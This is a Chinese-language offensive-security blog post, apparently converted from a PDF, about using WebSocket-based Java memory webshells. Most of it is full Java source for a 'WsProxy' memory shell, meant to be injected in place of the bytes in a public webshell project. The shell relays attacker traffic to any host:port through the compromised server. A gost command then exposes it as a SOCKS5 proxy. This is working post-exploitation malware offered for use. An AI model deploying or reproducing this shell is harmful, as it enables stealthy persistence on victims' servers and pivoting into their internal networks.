1
Websocket内存⻢利⽤的些补充
jspjs利⽤
WsProxy内存⻢
前⼀段时间有师傅提出了基于websocket的内存⻢，并给出了实现：
https://github.com/veo/wsMemShell 
本来想写⼀写，但是看到https://tttang.com/archive/1673/ 这篇师傅的⽂章已经写的很好了，这⾥就
提⼀些利⽤⽅⾯的东⻄。
最新版本的蚁剑已经⽀持连接websocket协议的内存⻢，在官⽅更新doc⾥提到pswindows跟
cmdlinux可以使⽤，其实jspjs类型也是可以直接连接的。上篇⽂章https://yzddmr6.com/posts/java-
expression-exploit/⾥⾯提到过为了兼容各种表达式注⼊，把jspjs类型的其他参数都合并为⼀个了，所
以直接把主payload部分发过去就完事了。 
jspjs利⽤ 
2
由于ws是全双⼯的，所以⽤来做代理⾮常的⽅便。原版的github项⽬中给出了cmd内存⻢的代码，但是
没有给wsproxy部分的内存⻢代码。因为defineClass⼀次只能打进去⼀个Class，改写内存⻢其实主要涉
及到类的复⽤。这⾥补充上⾃⼰修改的⼀个版本，使⽤的时候编译成class替换
https://github.com/veo/wsMemShell/blob/main/WsCmd.java⾥⾯的bytes： 
WsProxy内存⻢ 
3
Plain Text
复制代码
import javax.websocket.*;
import java.io.ByteArrayOutputStream;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.util.HashMap;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
public class WsProxy extends Endpoint implements 
CompletionHandler, MessageHandler.Whole {
    Session session;
    ByteBuffer buffer;
    public AsynchronousSocketChannel client;
    public Session channel;
    long i = 0;
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    HashMap map = new HashMap();
    void readFromServer(Session channel, AsynchronousSocketChannel 
client) {
        buffer = ByteBuffer.allocate(50000);
        WsProxy attach = new WsProxy();
        attach.client = client;
        attach.channel = channel;
        client.read(buffer, attach, this);
    }
    void process(ByteBuffer z, Session channel) {
        try {
            if (i > 1) {
                AsynchronousSocketChannel client = 
map.get(channel.getId());
                client.write(z).get();
                z.flip();
                z.clear();
            } else if (i == 1) {
                String values = new String(z.array());
                String[] array = values.split(" ");
                String[] addrarray = array[1].split(":");
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
4
                AsynchronousSocketChannel client = 
AsynchronousSocketChannel.open();
                int po = Integer.parseInt(addrarray[1]);
                InetSocketAddress hostAddress = new 
InetSocketAddress(addrarray[0], po);
                Future future = client.connect(hostAddress);
                try {
                    future.get(10, TimeUnit.SECONDS);
                } catch (Exception ignored) {
                    channel.getBasicRemote().sendText("HTTP/1.1 503 
Service Unavailable\r\n\r\n");
                    return;
                }
                map.put(channel.getId(), client);
                readFromServer(channel, client);
                channel.getBasicRemote().sendText("HTTP/1.1 200 
Connection Established\r\n\r\n");
            }
        } catch (Exception ignored) {
        }
    }
    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.session = session;
        i = 0;
        session.addMessageHandler(this);
    }
    @Override
    public void completed(Integer result, final WsProxy scAttachment) {
        buffer.clear();
        try {
            if (buffer.hasRemaining() && result >= 0) {
                byte[] arr = new byte[result];
                ByteBuffer b = buffer.get(arr, 0, result);
                baos.write(arr, 0, result);
                ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                if (scAttachment.channel.isOpen()) {
                    scAttachment.channel.getBasicRemote().sendBinary(q);
                }
                baos = new ByteArrayOutputStream();
                readFromServer(scAttachment.channel, 
scAttachment.client);
            } else {
                if (result > 0) {
                    byte[] arr = new byte[result];
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
5
注意路径⼀定要⽤?path=xxx表示，不能直接填endpoint的地址，如ws://192.168.88.130:8083/shell/p 
具体可以看gost的⽂档，当时⼀直被这⾥卡住连不上：
https://gost.run/reference/dialers/ws/#websocket_1 
配好socks后就可以进⾏愉快的代理了:) 
                    ByteBuffer b = buffer.get(arr, 0, result);
                    baos.write(arr, 0, result);
                    readFromServer(scAttachment.channel, 
scAttachment.client);
                }
            }
        } catch (Exception ignored) {
        }
    }
    @Override
    public void failed(Throwable t, WsProxy scAttachment) {
        t.printStackTrace();
    }
    @Override
    public void onMessage(ByteBuffer message) {
        try {
            message.clear();
            i++;
            process(message, session);
        } catch (Exception ignored) {
        }
    }
}
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
Plain Text
复制代码
./gost-windows-amd64.exe -L "socks5://:1180" -F 
"ws://192.168.88.130:8083?path=/shell/p"
1
6